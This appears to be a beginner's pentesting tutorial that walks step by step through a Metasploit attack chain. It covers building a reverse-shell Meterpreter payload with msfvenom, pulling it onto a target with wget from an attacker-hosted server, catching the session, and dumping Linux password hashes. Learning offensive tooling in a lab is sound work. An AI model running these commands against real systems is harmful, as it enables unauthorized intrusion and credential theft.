Msfvenom is a powerful tool within the Metasploit Framework, used to create various types of payloads that can be deployed to gain access to a system. In this guide, we'll go through the following steps:

Creating a Payload
Transferring the Payload
Setting Up a Listener
Running the Payload and Establishing a Meterpreter Session
Using Post-Exploitation Modules

# Step 1: Creating a Payload

- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f elf > payload.elf

Explanation:

-p: Specifies the payload type; in this case, linux/x86/meterpreter/reverse_tcp.
LHOST: Set to your attacking machine's IP address.
LPORT: The port on which you want to receive the connection.
-f elf: Defines the output format (here, ELF for Linux binaries).
>: Redirects the output to a file named payload.elf.

![image](https://github.com/user-attachments/assets/19c1737e-a7d7-4759-b212-3219d6812df3)


# Step 2: Transferring the Payload

Start a simple Python HTTP server on your attacking machine to host the payload:

- python -m http.server 9000

This command sets up an HTTP server that allows the target machine to download the payload via a simple HTTP request.

![image](https://github.com/user-attachments/assets/088c6d6b-b56e-45c0-9849-52bcfa183e70)


On the target machine (the compromised host), use the wget command to download the payload:

- wget http://<attacker IP>:9000/payload.elf

This pulls the payload file from the attacking machine to the target system.

![Capture d'écran 2024-10-18 210150](https://github.com/user-attachments/assets/c7a577c7-481c-4e92-a1ad-7f30904d125b)


# Step 3: Setting Up a Listener

In Metasploit, set up a multi/handler module to listen for the connection from the payload:

- use exploit/multi/handler
- set payload linux/x86/meterpreter/reverse_tcp
- set LHOST <attacker IP>
- set LPORT <attacker port>
- exploit

![Capture d'écran 2024-10-18 210000](https://github.com/user-attachments/assets/c4671c21-2966-4e2e-9060-040b753287c5)

use exploit/multi/handler: This module handles connections from payloads like the one we generated.

set payload: Specifies the payload type, matching what was used in the msfvenom command.

set LHOST and set LPORT: Must match the IP and port specified during payload creation.

exploit: Starts the listener.

![Capture d'écran 2024-10-18 210017](https://github.com/user-attachments/assets/f96ccf2d-3339-43d4-9fc7-7a1b76e9defa)


# Step 4: Running the Payload:

On the target machine, execute the payload:

- chmod +x payload.elf
./payload.elf

chmod +x payload.elf: Makes the file executable.

./payload.elf: Runs the payload.

Once executed, if the payload connects successfully, Metasploit should open a Meterpreter session.

![Capture d'écran 2024-10-18 210221](https://github.com/user-attachments/assets/d94ffe38-d655-4f76-89dd-32637269e028)


# Step 5: Post-Exploitation with Meterpreter

Hash Dumping:

In the screenshots, we see the search for hashdump modules using search hashdump and the selection of a Linux hashdump module.

- use post/linux/gather/hashdump
- set SESSION 1
- run

![Capture d'écran 2024-10-18 210051](https://github.com/user-attachments/assets/c952ae00-2856-4f91-8a1e-1e4a31f72fb6)

![Capture d'écran 2024-10-18 210059](https://github.com/user-attachments/assets/51065488-e530-4f5b-bdda-b73638df9abe)


use post/linux/gather/hashdump: Loads the hashdump module for Linux systems.

set SESSION 1: Associates the module with the active Meterpreter session.

run: Executes the module to retrieve password hashes.

![Capture d'écran 2024-10-18 210059](https://github.com/user-attachments/assets/0c1a3352-7a4d-4347-b7d2-0f62879d1378)


# Conclusion

Metasploit and Msfvenom, when used together, provide a powerful mechanism for penetration testers to generate, deploy, and manage payloads effectively. Mastering these tools is essential for becoming a proficient pentester, as it enables the simulation of real-world attacks and helps in understanding defensive mechanisms better.

By following these steps, you can practice the entire lifecycle of exploiting a target using Metasploit and Msfvenom—from creating payloads to post-exploitation activities like hash extraction.

This guide shows a small part of what Metasploit can achieve, and I’m excited to continue developing my skills as I work toward becoming a professional pentester.


























